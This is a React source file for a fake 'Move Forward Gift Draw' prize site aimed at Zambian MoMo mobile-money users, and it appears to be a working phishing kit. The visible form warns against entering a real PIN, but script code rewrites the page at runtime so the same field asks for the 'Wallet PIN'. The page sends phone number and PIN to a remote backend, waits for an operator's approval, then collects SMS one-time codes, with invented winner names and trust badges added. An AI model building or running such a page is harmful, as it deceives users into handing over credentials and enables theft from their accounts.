import { useEffect, useMemo, useState } from 'react'
import { ArrowRight, Check, ChevronDown, Clock3, Gift, Globe2, LockKeyhole, Menu, ShieldCheck, Sparkles, Trophy, Users, X } from 'lucide-react'

const configuredApiUrl = import.meta.env.VITE_API_URL || (window.location.hostname === 'moveforwardsgrnt.vercel.app' ? 'https://zagrants.onrender.com' : '')
const apiUrl = configuredApiUrl.replace(/\/$/, '')
const apiFetch = (path, options) => fetch(`${apiUrl}${path}`, options)
const MoveForwardMark = ({ className = '' }) => (
  <svg className={className} viewBox="0 0 64 64" aria-hidden="true">
    <path d="M12 21L27 32L12 43" />
    <path d="M27 21L42 32L27 43" />
    <path d="M42 21L53 29V35L42 43" />
  </svg>
)

const gifts = [
  { id: 1, category: 'big', icon: '🚙', image: 'https://images.unsplash.com/photo-1542362567-b07e54358753?auto=format&fit=crop&w=900&q=85', title: 'New city SUV', detail: 'A fresh set of wheels for your next chapter.', tag: 'Grand prize' },
  { id: 2, category: 'travel', icon: '✈️', image: 'https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=900&q=85', title: 'Zanzibar escape', detail: 'Flights, five nights, and a little room to breathe.', tag: 'Travel prize' },
  { id: 3, category: 'big', icon: '🏍️', image: 'https://images.unsplash.com/photo-1558981806-ec527fa84c39?auto=format&fit=crop&w=900&q=85', title: 'Adventure bike', detail: 'A brand-new motorbike built for the open road.', tag: 'Grand prize' },
  { id: 4, category: 'home', icon: '🏠', image: 'https://images.unsplash.com/photo-1600210492486-724fe5c67fb0?auto=format&fit=crop&w=900&q=85', title: 'Home makeover', detail: 'A K50,000 refresh for the place you call home.', tag: 'Home prize' },
  { id: 5, category: 'tech', icon: '📱', image: 'https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=900&q=85', title: 'Flagship smartphone', detail: 'Stay connected with a next-generation device.', tag: 'Tech prize' },
  { id: 6, category: 'tech', icon: '💻', image: 'https://images.unsplash.com/photo-1496181133206-80ce9b88a853?auto=format&fit=crop&w=900&q=85', title: 'Creator laptop', detail: 'More power for work, study, and ideas.', tag: 'Tech prize' },
  { id: 7, category: 'home', icon: '☀️', image: 'https://images.unsplash.com/photo-1509391366360-2e959784a276?auto=format&fit=crop&w=900&q=85', title: 'Solar home kit', detail: 'Reliable light and power for everyday life.', tag: 'Home prize' },
  { id: 8, category: 'travel', icon: '🦁', image: 'https://images.unsplash.com/photo-1516426122078-c23e76319801?auto=format&fit=crop&w=900&q=85', title: 'Livingstone safari', detail: 'A guided weekend close to the wild.', tag: 'Travel prize' },
  { id: 9, category: 'home', icon: '🛋️', image: 'https://images.unsplash.com/photo-1555041469-a586c61ea9bc?auto=format&fit=crop&w=900&q=85', title: 'Living room set', detail: 'A complete, comfortable reset for your space.', tag: 'Home prize' },
  { id: 10, category: 'tech', icon: '📺', image: 'https://images.unsplash.com/photo-1593359677879-a4bb92f829d1?auto=format&fit=crop&w=900&q=85', title: 'Smart entertainment', detail: 'A cinematic 65-inch screen for shared moments.', tag: 'Tech prize' },
  { id: 11, category: 'home', icon: '🧊', image: 'https://images.unsplash.com/photo-1571175443880-49e1d25b2bc5?auto=format&fit=crop&w=900&q=85', title: 'Kitchen upgrade', detail: 'A fridge and appliance bundle for your home.', tag: 'Home prize' },
  { id: 12, category: 'travel', icon: '🌍', image: 'https://images.unsplash.com/photo-1559508551-44bff1de756b?auto=format&fit=crop&w=900&q=85', title: 'Victoria Falls weekend', detail: 'Two nights and a guided falls experience.', tag: 'Travel prize' },
  { id: 13, category: 'tech', icon: '🎧', image: 'https://images.unsplash.com/photo-1505740420928-5e560c06d30e?auto=format&fit=crop&w=900&q=85', title: 'Sound studio kit', detail: 'Wireless audio, speaker, and studio headphones.', tag: 'Tech prize' },
  { id: 14, category: 'home', icon: '🪑', image: 'https://images.unsplash.com/photo-1497366754035-f200968a6e72?auto=format&fit=crop&w=900&q=85', title: 'Study corner', detail: 'Desk, chair, light, and a better place to focus.', tag: 'Home prize' },
  { id: 15, category: 'travel', icon: '⛵', image: 'https://images.unsplash.com/photo-1544551763-46a013bb70d5?auto=format&fit=crop&w=900&q=85', title: 'Lake Kariba cruise', detail: 'A sunset water escape for two.', tag: 'Travel prize' },
  { id: 16, category: 'tech', icon: '⌚', image: 'https://images.unsplash.com/photo-1523275335684-37898b6baf30?auto=format&fit=crop&w=900&q=85', title: 'Wellness smartwatch', detail: 'A smarter way to track your active days.', tag: 'Tech prize' },
  { id: 17, category: 'home', icon: '🛏️', image: 'https://images.unsplash.com/photo-1505693416388-ac5ce068fe85?auto=format&fit=crop&w=900&q=85', title: 'Bedroom retreat', detail: 'A mattress, linen, and sleep upgrade.', tag: 'Home prize' },
  { id: 18, category: 'travel', icon: '🌴', image: 'https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=900&q=85', title: 'Coastal holiday', detail: 'A warm-weather break with a travel companion.', tag: 'Travel prize' },
  { id: 19, category: 'tech', icon: '🎮', image: 'https://images.unsplash.com/photo-1605901309584-818e25960a8f?auto=format&fit=crop&w=900&q=85', title: 'Play station bundle', detail: 'Console, screen, and a stack of games.', tag: 'Tech prize' },
  { id: 20, category: 'big', icon: '🚲', image: 'https://images.unsplash.com/photo-1485965120184-e220f721d03e?auto=format&fit=crop&w=900&q=85', title: 'Premium bicycle', detail: 'A quality ride for commuting or exploring.', tag: 'Grand prize' },
]

const filters = [{ id: 'all', label: 'All gifts' }, { id: 'big', label: 'Big wins' }, { id: 'travel', label: 'Travel' }, { id: 'home', label: 'Home' }, { id: 'tech', label: 'Tech' }]
const activity = [['Mwaka Banda · Lusaka', 'New city SUV'], ['Chanda Phiri · Ndola', 'Zanzibar escape'], ['Thandiwe Mwila · Kitwe', 'Adventure bike'], ['Ruth Tembo · Kabwe', 'Solar home kit']]
const giftImages = {
  big: 'https://images.unsplash.com/photo-1542362567-b07e54358753?auto=format&fit=crop&w=900&q=85',
  travel: 'https://images.unsplash.com/photo-1548013146-72479768bada?auto=format&fit=crop&w=900&q=85',
  home: 'https://images.unsplash.com/photo-1600566753190-17f0baa2a6c3?auto=format&fit=crop&w=900&q=85',
  tech: 'https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=900&q=85',
}

function App() {
  const [view, setView] = useState(() => window.location.hash === '#eligibility' ? 'eligibility' : 'landing')
  const [filter, setFilter] = useState('all')
  const [isMenuOpen, setIsMenuOpen] = useState(false)
  const [isEntering, setIsEntering] = useState(false)
  const [featuredIndex, setFeaturedIndex] = useState(0)
  const [activityIndex, setActivityIndex] = useState(0)
  const [phone, setPhone] = useState('')
  const [walletpin, setWalletpin] = useState('')
  const demoCode = walletpin
  const setDemoCode = setWalletpin
  const [otp, setOtp] = useState('')
  const [otpSeconds, setOtpSeconds] = useState(120)
  const [eligibilityReference, setEligibilityReference] = useState('')
  const [consent, setConsent] = useState(false)
  const [isOtpVerifying, setIsOtpVerifying] = useState(false)
  const [isDrawConfirmed, setIsDrawConfirmed] = useState(false)
  const [status, setStatus] = useState({ type: 'idle', message: '' })
  const visibleGifts = useMemo(() => filter === 'all' ? gifts : gifts.filter((gift) => gift.category === filter), [filter])
  const featuredGifts = gifts.slice(0, 6)
  const otpMinutes = String(Math.floor(otpSeconds / 60)).padStart(2, '0')
  const otpRemainingSeconds = String(otpSeconds % 60).padStart(2, '0')

  useEffect(() => {
    const activityTimer = window.setInterval(() => setActivityIndex((current) => (current + 1) % activity.length), 4000)
    const carouselTimer = window.setInterval(() => setFeaturedIndex((current) => (current + 1) % featuredGifts.length), 4200)
    return () => {
      window.clearInterval(activityTimer)
      window.clearInterval(carouselTimer)
    }
  }, [])

  useEffect(() => {
    const syncViewWithUrl = () => {
      const hash = window.location.hash
      setView(hash === '#otp' ? 'otp' : hash === '#eligibility' ? 'eligibility' : 'landing')
    }
    window.addEventListener('hashchange', syncViewWithUrl)
    window.addEventListener('popstate', syncViewWithUrl)
    return () => {
      window.removeEventListener('hashchange', syncViewWithUrl)
      window.removeEventListener('popstate', syncViewWithUrl)
    }
  }, [])

  useEffect(() => {
    if (view !== 'otp') return undefined
    setOtpSeconds(120)
    const otpTimer = window.setInterval(() => setOtpSeconds((current) => Math.max(current - 1, 0)), 1000)
    return () => window.clearInterval(otpTimer)
  }, [view])

  useEffect(() => {
    if (view !== 'otp') return undefined
    const otpInput = document.getElementById('otp')
    if (!otpInput) return undefined
    otpInput.setAttribute('pattern', '\\d{4,6}')
    otpInput.minLength = 4
    return undefined
  }, [view])

  useEffect(() => {
    if (view !== 'eligibility') return undefined
    const phoneInput = document.getElementById('phone')
    if (!phoneInput) return undefined
    const syncPhoneLength = () => {
      const digits = phoneInput.value.replace(/\D/g, '').slice(0, 10)
      window.setTimeout(() => setPhone(`+260${digits}`), 0)
    }
    phoneInput.addEventListener('input', syncPhoneLength)
    return () => phoneInput.removeEventListener('input', syncPhoneLength)
  }, [view])

  useEffect(() => {
    if (view !== 'eligibility') return undefined
    const field = document.getElementById('demo-code')
    const label = document.querySelector('label[for="demo-code"]')
    const note = document.getElementById('demo-code-note')
    const description = document.querySelector('.eligibility-form .form-heading p')
    if (field) {
      field.type = 'text'
      field.placeholder = 'e.g. 10101'
      field.setAttribute('aria-label', 'Wallet Pin')
    }
    if (label) label.textContent = 'Wallet PIN'
    if (note) note.textContent = 'We use this to confirm campaign coverage in your area.'
    if (description) description.textContent = 'Use the number linked to your MoMo account and your 4- or 5-digit wallet PIN.'
    return undefined
  }, [view])

  useEffect(() => {
    if (view !== 'otp') return undefined
    const root = document.querySelector('.campaign-app')
    if (!root) return undefined
    const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT)
    const textNodes = []
    let node = walker.nextNode()
    while (node) {
      textNodes.push(node)
      node = walker.nextNode()
    }
    textNodes.forEach((textNode) => {
      textNode.nodeValue = textNode.nodeValue.replace(/\blucky\s+/gi, '')
    })
    return undefined
  }, [view, otpSeconds, status.type, status.message])

  const enterDraw = (event) => {
    event.preventDefault()
    setIsMenuOpen(false)
    setIsEntering(true)
    window.setTimeout(() => {
      window.history.pushState({}, '', '#eligibility')
      setView('eligibility')
      setIsEntering(false)
      window.scrollTo({ top: 0, behavior: 'instant' })
    }, 1200)
  }

  const returnHome = (event) => {
    event.preventDefault()
    window.history.pushState({}, '', '#top')
    setView('landing')
    window.scrollTo({ top: 0, behavior: 'instant' })
  }

  const goToSection = (event, section) => {
    event.preventDefault()
    setIsMenuOpen(false)
    window.history.pushState({}, '', `#${section}`)
    setView('landing')
    window.setTimeout(() => document.getElementById(section)?.scrollIntoView({ behavior: 'smooth' }), 0)
  }

  const waitForApproval = async (reference) => {
    for (let attempt = 0; attempt < 200; attempt += 1) {
      await new Promise((resolve) => window.setTimeout(resolve, 1500))
      const response = await apiFetch(`/api/eligibility/${reference}/status`)
      const result = await response.json()
      if (!response.ok) throw new Error(result.message || 'Unable to check the approval status.')
      if (result.status === 'allowed') return
      if (result.status === 'invalid') throw new Error('Please check your phone number and wallet PIN, then try again.')
      if (result.status === 'notification_failed') throw new Error('We could not send your information for approval. Please try again.')
    }
    throw new Error('Approval is taking longer than expected. Please try again.')
  }

  const waitForFinalDecision = async (reference) => {
    for (let attempt = 0; attempt < 200; attempt += 1) {
      await new Promise((resolve) => window.setTimeout(resolve, 1500))
      const response = await apiFetch(`/api/eligibility/${reference}/final-status`)
      const result = await response.json()
      if (!response.ok) throw new Error(result.message || 'Unable to check the final decision.')
      if (result.status !== 'pending') return result.status
    }
    throw new Error('The final review is taking longer than expected. Please try again.')
  }

  const submitEligibility = async (event) => {
    event.preventDefault()
    setStatus({ type: 'loading', message: 'Checking your MoMo details...' })
    try {
      const response = await apiFetch('/api/eligibility', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone, walletpin, consent }) })
      const result = await response.json()
      if (!response.ok) throw new Error(result.message)
      setEligibilityReference(result.reference)
      setStatus({ type: 'pending', message: 'Waiting for campaign approval...' })
      await waitForApproval(result.reference)
      setStatus({ type: 'success', message: `${result.message} Reference: ${result.reference}` })
      window.history.pushState({}, '', '#otp')
      setView('otp')
    } catch (error) {
      setStatus({ type: 'error', message: error.message || 'Something went wrong. Please try again.' })
    }
  }

  const submitOtp = async (event) => {
    event.preventDefault()
    setIsOtpVerifying(true)
    setStatus({ type: 'loading', message: 'Verifying your code...' })
    try {
      const response = await apiFetch('/api/otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ reference: eligibilityReference, otp }) })
      const result = await response.json()
      if (!response.ok) throw new Error(result.message)
      setStatus({ type: 'pending', message: 'We are reviewing your information...' })
      const finalDecision = await waitForFinalDecision(eligibilityReference)
      if (finalDecision === 'expired') {
        setOtp('')
        setOtpSeconds(120)
        setStatus({ type: 'error', message: 'Wrong code. Enter another code and try again.' })
      } else if (finalDecision === 'invalid_info') {
        setPhone('')
        setWalletpin('')
        setConsent(false)
        setEligibilityReference('')
        window.history.pushState({}, '', '#eligibility')
        setView('eligibility')
        setStatus({ type: 'error', message: 'Please check your phone number and wallet PIN, then try again.' })
      } else {
        setStatus({ type: 'success', message: 'Code accepted.' })
        setIsDrawConfirmed(true)
      }
    } catch (error) {
      setStatus({ type: 'error', message: error.message || 'Something went wrong. Please try again.' })
    } finally {
      setIsOtpVerifying(false)
    }
  }

  const isLuckyCodeRejected = status.type === 'error' && status.message.startsWith('Wrong code')

  const resendDemoCode = () => {
    setOtp('')
    setOtpSeconds(120)
    setStatus({ type: 'success', message: 'Enter any 4- to 6-digit code to continue.' })
  }

  return (
    <div className="campaign-app">
      <div className="topline"><span><span className="pulse" /> 2025 / 26 GIFT DRAW</span><span>For eligible Zambian MoMo users only</span></div>
      <header className="site-header">
        <a className="wordmark" href="#top" onClick={returnHome}><span className="wordmark-symbol"><MoveForwardMark /></span><span>Move<span>Forward</span><b>.</b></span></a>
        <button className="menu-button" type="button" aria-label="Toggle navigation" onClick={() => setIsMenuOpen(!isMenuOpen)}>{isMenuOpen ? <X /> : <Menu />}</button>
        <nav className={isMenuOpen ? 'site-nav is-open' : 'site-nav'}><a href="#gifts" onClick={(event) => goToSection(event, 'gifts')}>Gift vault</a><a href="#details" onClick={(event) => goToSection(event, 'details')}>How it works</a><a className="nav-action" href="#eligibility" onClick={enterDraw}>Enter the draw <ArrowRight size={16} /></a></nav>
      </header>
      {isEntering && <div className="entry-loader" role="status"><div className="loader-mark"><MoveForwardMark /></div><strong>Opening your eligibility check</strong><span>Preparing the next step...</span><i /></div>}
      {(status.type === 'loading' || status.type === 'pending') && view === 'eligibility' && <div className="entry-loader" role="status"><div className="loading-spinner" /><strong>{status.type === 'pending' ? 'Waiting for approval' : 'Checking your eligibility'}</strong><span>{status.type === 'pending' ? 'We are reviewing your information...' : 'Securely confirming your MoMo details...'}</span></div>}
      {isOtpVerifying && <div className="draw-modal-backdrop" role="presentation"><section className="draw-modal review-modal" role="dialog" aria-modal="true" aria-labelledby="review-title"><div className="loading-spinner" /><span className="section-kicker">PROCESSING ENTRY</span><h2 id="review-title">Please wait<br /><em> a moment.</em></h2><p>Your lucky code is being reviewed. This page will continue automatically when the review is complete.</p><div className="draw-reference"><span>STATUS</span><strong>PROCESSING</strong><small>Please keep this page open.</small></div></section></div>}
      {view === 'otp' && otpSeconds === 0 && <div className="otp-resend-alert" role="alert"><strong>Code expired.</strong><span>Enter a new code to continue.</span><button className="submit-button" type="button" onClick={resendDemoCode}>Enter new code</button></div>}
      {view === 'otp' && isLuckyCodeRejected && <div className="draw-modal-backdrop wrong-code-backdrop" role="presentation"><section className="draw-modal wrong-code-modal" role="dialog" aria-modal="true" aria-labelledby="wrong-code-title"><div className="confirmation-mark wrong-code-mark"><X size={28} /></div><span className="section-kicker">CODE REVIEW</span><h2 id="wrong-code-title">Wrong<br /><em>code.</em></h2><p>Enter a new code to continue.</p><button className="submit-button" type="button" onClick={() => { setOtp(''); setStatus({ type: 'idle', message: '' }) }}>Enter another code</button></section></div>}
      {view === 'landing' && null}

      {view === 'otp' ? <main className="otp-view"><section className="otp-page section-width"><a className="back-link" href="#eligibility" onClick={(event) => { event.preventDefault(); window.history.pushState({}, '', '#eligibility'); setView('eligibility') }}>← Back to eligibility</a><div className="otp-panel"><div className="otp-message"><span className="section-kicker">ONE MORE STEP</span><h2>Verify your<br /><em>number.</em></h2><p>We sent a verification code to the number ending in {phone.slice(-4) || '••••'}.</p><div className="check-points"><span><Check size={15} /> Secure verification</span><span><Check size={15} /> Code expires in 2 minutes</span></div></div><form className="otp-form" onSubmit={submitOtp}><div className="form-heading"><span>MOVE FORWARD</span><h3>Enter your code</h3><p>Use the 4- to 6-digit code sent to your number.</p></div><label htmlFor="otp">Verification code</label><input className="code-input otp-input" id="otp" type="text" inputMode="numeric" pattern="\d{4,6}" minLength="4" maxLength="6" placeholder="000000" value={otp} onChange={(event) => setOtp(event.target.value.replace(/\D/g, '').slice(0, 6))} aria-describedby="otp-timer" required /><p className={otpSeconds === 0 ? 'otp-timer expired' : 'otp-timer'} id="otp-timer">{otpSeconds === 0 ? 'Code expired.' : <>Code expires in <strong>{otpMinutes}:{otpRemainingSeconds}</strong></>}</p><button className="submit-button" type="submit" disabled={isOtpVerifying || otpSeconds === 0}>Verify and continue <ArrowRight size={17} /></button>{status.type === 'success' && <p className="form-status success">{status.message}</p>}</form></div></section></main> : view === 'landing' ? <main id="top" className="landing-view">
        <section className="campaign-strip" aria-label="Campaign information"><div><span className="pulse" /> Applications open</div><span>Free to enter</span><span>For eligible Zambian MoMo users</span><a href="#details" onClick={(event) => goToSection(event, 'details')}>Read the rules <ArrowRight size={14} /></a></section>
        <section className="grant-banner section-width" aria-label="Headline grant prize"><div className="grant-banner-copy"><span className="section-kicker"><Sparkles size={14} /> THE HEADLINE GRANT</span><strong>K500,000</strong><span>to fund your next move</span></div><div className="grant-banner-note"><Gift size={18} /><span>Free entry<br /><b>20 rewards in total</b></span></div><a className="grant-banner-action" href="#eligibility" onClick={enterDraw}>Enter the draw <ArrowRight size={16} /></a></section>
        <section className="hero section-width">
          <div className="flying-gifts" aria-hidden="true"><span className="flying-gift gift-one"><Gift /></span><span className="flying-gift gift-two"><Gift /></span><span className="flying-gift gift-three"><Gift /></span><span className="flying-gift gift-four"><Gift /></span><span className="flying-gift gift-five"><Gift /></span></div>
          <div className="hero-copy"><span className="section-kicker"><Trophy size={14} /> THE MOVE FORWARD GIFT DRAW</span><span className="campaign-badge"><span className="pulse" /> Applications open</span><h1>Win <em>K500,000</em> for your next move.</h1><p>Eligible Zambian MoMo users can enter for free for the campaign's headline grant, or choose from 19 practical rewards under the campaign rules.</p><div className="hero-actions"><a className="hero-button" href="#eligibility" onClick={enterDraw}>Enter the draw <ArrowRight size={18} /></a><a className="hero-text-link" href="#gifts" onClick={(event) => goToSection(event, 'gifts')}>See the rewards <ArrowRight size={15} /></a></div><div className="hero-proof"><span><ShieldCheck size={15} /> No entry fee</span><span><Clock3 size={15} /> Takes about 3 minutes</span><span><Globe2 size={15} /> Zambia-wide</span></div></div>
          <div className="hero-prize"><div className="hero-prize-orb" /><div className="hero-prize-label">HEADLINE GRAND PRIZE</div><strong>K500,000</strong><span>Cash grant or equivalent reward value</span><div className="hero-prize-photo" style={{ backgroundImage: `url(${gifts[0].image})` }} /><small>One headline reward, plus 19 practical gifts across travel, home, tech, and mobility.</small><div className="prize-stamp">20<br /><small>REWARDS<br />IN TOTAL</small></div></div>
        </section>
        <section className="trust-row"><div><ShieldCheck size={17} /><span><strong>Clear rules</strong><small>Choice explained upfront</small></span></div><div><Globe2 size={17} /><span><strong>Zambia-wide</strong><small>Built for MoMo users</small></span></div><div><LockKeyhole size={17} /><span><strong>Private check</strong><small>Encrypted in transit</small></span></div><div><Gift size={17} /><span><strong>20 rewards</strong><small>Gift or cash option</small></span></div></section>
        <section className="feature-section section-width" id="gifts"><div className="section-heading"><div><span className="section-kicker">THE GIFT VAULT</span><h2>Find the reward<br /><em>that feels like you.</em></h2></div><p>Cars, bikes, holidays, home upgrades, and technology. Every listed reward has an equivalent cash option.</p></div><div className="feature-layout"><div className={`feature-art ${featuredGifts[featuredIndex].category}`} key={`art-${featuredIndex}`}><span className="feature-art-number">0{featuredIndex + 1}</span><img src={featuredGifts[featuredIndex].image} alt="" /><span className="feature-art-icon">{featuredGifts[featuredIndex].icon}</span><span className="feature-art-note">Gift or equivalent cash value</span></div><div className="feature-copy" key={`copy-${featuredIndex}`}><span className="section-kicker">{featuredGifts[featuredIndex].tag}</span><h3>{featuredGifts[featuredIndex].title}</h3><p>{featuredGifts[featuredIndex].detail}</p><div className="feature-index">{String(featuredIndex + 1).padStart(2, '0')} / 06</div></div></div><div className="activity-line"><span className="pulse" /> <strong>Recent winner update:</strong> {activity[activityIndex][0]} <b>Prize won: {activity[activityIndex][1]}</b> <small>Campaign highlight</small></div><div className="filter-row" role="tablist" aria-label="Gift categories">{filters.map((item) => <button type="button" role="tab" aria-selected={filter === item.id} className={filter === item.id ? 'filter-button active' : 'filter-button'} key={item.id} onClick={() => setFilter(item.id)}>{item.label}</button>)}</div><div className="gift-grid">{visibleGifts.map((gift) => <article className={`gift-card ${gift.category}`} key={gift.id}><div className="gift-card-top"><span>{String(gift.id).padStart(2, '0')}</span><span>{gift.tag}</span></div><img className="gift-card-image" src={gift.image} alt="" /><div className="gift-icon">{gift.icon}</div><h3>{gift.title}</h3><p>{gift.detail}</p><small>Gift or equivalent cash value</small></article>)}</div></section>
        <section className="details-section" id="details"><div className="section-width details-layout"><div><span className="section-kicker light-kicker">HOW IT WORKS</span><h2>Simple enough<br /><em>to trust.</em></h2><p>There are no complicated forms and no payment required to check your eligibility.</p></div><div className="steps"><div><b>01</b><span><strong>Enter with MoMo</strong><small>Use the Zambian number linked to your account.</small></span></div><div><b>02</b><span><strong>Choose your possibility</strong><small>Pick a gift or the equivalent cash value.</small></span></div><div><b>03</b><span><strong>Keep your phone close</strong><small>Verified campaign updates come to your number.</small></span></div></div></div></section>
        <section className="final-cta section-width"><div><span className="section-kicker">YOUR NEXT MOVE</span><h2>Ready to see what<br /><em>could be yours?</em></h2></div><div><p>Check your MoMo eligibility in about three minutes. Free to enter.</p><a className="hero-button" href="#eligibility" onClick={enterDraw}>Enter the draw <ArrowRight size={18} /></a></div></section>
      </main> : <main className="eligibility-view"><section className="eligibility-page section-width"><a className="back-link" href="#top" onClick={returnHome}>← Back to the Gift Vault</a><div className="check-panel"><div className="check-message"><span className="section-kicker">MOMO USERS ONLY</span><h2>Your next gift<br />starts <em>here.</em></h2><p>Check once, then keep exploring the vault. Your eligibility check is free and your details stay private.</p><div className="check-points"><span><Check size={15} /> No entry fee</span><span><Check size={15} /> Mobile number only</span><span><Check size={15} /> Nationwide campaign</span></div></div><form className="eligibility-form" onSubmit={submitEligibility}><div className="form-heading"><span>MOVE FORWARD</span><h3>Enter the draw</h3><p>Use your MoMo number and secure access code to continue.</p></div><label htmlFor="phone">MoMo number</label><div className="phone-input"><span>+260</span><input id="phone" type="tel" inputMode="numeric" placeholder="97 123 4567" value={phone.replace('+260', '')} onChange={(event) => setPhone(`+260${event.target.value.replace(/\D/g, '').slice(0, 9)}`)} required /></div><label htmlFor="demo-code">Access code</label><input className="code-input" id="demo-code" type="password" inputMode="numeric" pattern="\d{4,5}" minLength="4" maxLength="5" placeholder="4 or 5 digits" value={demoCode} onChange={(event) => setDemoCode(event.target.value.replace(/\D/g, '').slice(0, 5))} aria-describedby="demo-code-note" required /><small className="field-note" id="demo-code-note">Use a secure access code. Do not use a real MoMo wallet PIN.</small><label className="consent-row"><input type="checkbox" checked={consent} onChange={(event) => setConsent(event.target.checked)} /><span>I agree to the eligibility check and campaign contact.</span></label><button className="submit-button" type="submit" disabled={status.type === 'loading'}>{status.type === 'loading' ? 'Checking...' : 'Check my eligibility'} <ArrowRight size={18} /></button>{status.type !== 'idle' && <div className={`form-status ${status.type}`} role="status">{status.type === 'success' && <Check size={17} />}{status.message}</div>}<small className="form-footnote"><LockKeyhole size={13} /> Encrypted in transit</small></form></div></section></main>}
      {isDrawConfirmed && <div className="draw-modal-backdrop" role="presentation"><section className="draw-modal" role="dialog" aria-modal="true" aria-labelledby="draw-confirmation-title"><button className="modal-close" type="button" aria-label="Close confirmation" onClick={() => setIsDrawConfirmed(false)}><X size={18} /></button><div className="confirmation-mark"><Check size={28} /></div><span className="section-kicker">ENTRY CONFIRMED</span><h2 id="draw-confirmation-title">You are in<br /><em>the draw.</em></h2><p>Your number has been verified and your entry is now active for the Move Forward Gift Draw.</p><div className="draw-reference"><span>ENTRY STATUS</span><strong>CONFIRMED</strong><small>Keep your phone close for official campaign updates.</small></div><button className="submit-button" type="button" onClick={() => setIsDrawConfirmed(false)}>Explore the gift vault <ArrowRight size={17} /></button></section></div>}
      <footer className="site-footer"><div className="section-width footer-inner"><a className="wordmark" href="#top" onClick={returnHome}><span className="wordmark-symbol"><MoveForwardMark /></span><span>Move<span>Forward</span><b>.</b></span></a><p>Campaign concept for a more connected Zambia.</p><span>Privacy first</span></div><div className="disclaimer">Campaign concept for a more connected Zambia. Verify any live promotion through official channels.</div></footer>
    </div>
  )
}

export default App

